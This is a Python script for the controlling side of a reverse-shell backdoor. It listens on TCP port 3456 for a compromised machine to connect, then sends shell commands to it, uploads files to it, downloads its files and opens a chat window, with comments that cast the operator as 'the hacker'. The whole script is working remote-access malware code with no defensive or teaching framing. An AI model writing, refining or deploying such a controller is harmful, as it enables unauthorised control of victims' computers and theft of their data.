#!/usr/bin/env python3

import socket
import json
import base64
import subprocess

class Listener:
    def __init__(self, address):
        # Creates sockets and listen for connections
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # to use ipv4 and tcp stream
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)      # to resuse sockets, if breaks,1 to enable this
        listener.bind(address)
        listener.listen(0)                                                  # 0 backlogs, no. of unaccepted connections 

        print(" [+] Waiting for connection.....")
        self.connection, address = listener.accept()                        # returns object to send and receive data, and address
        print(" [+] Connection received from "+ str(address))

    def reliable_send(self, data):
        # Sends data error free
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        # Receives data error free
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)         # 1024 is the no. of bytes to be used
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self, path):
        # Reads the file content
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        # Writes the file received file content to the file
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successfull."

    def execute_remotely(self, command):
        # Commands are send to the target to execute
        if command[0] == "upload":
            file_content = self.read_file(command[1])
            command.append(file_content)
        elif command[0] == "chat" and command[1] == "start":
            # subprocess.call("gnome-terminal -t HACKER --zoom=1.5 -- ./auto_chat_listener.py", shell=True)     # for linux
            subprocess.call('start "HACKED" cmd /k py auto_chat_listener.py', shell=True)                       # for windows
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def run(self):
        # Takes the input from the hacker
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                command_result = self.execute_remotely(command)
                if command[0] == "download" and "[-] >>" not in command_result:
                    command_result = self.write_file(command[1], command_result)
            except Exception as error:
                command_result = "[-] >> " + str(error)
            print(command_result)

# main code
# address = socket.gethostbyname_ex(socket.gethostname()) [-1][-1]                    # it gets the host machine address automatically(for testing on local machine)
address = ""                                                                          #  ip address at which server is to be hosted
port = 3456
ha_listener = Listener((address, port))
ha_listener.run()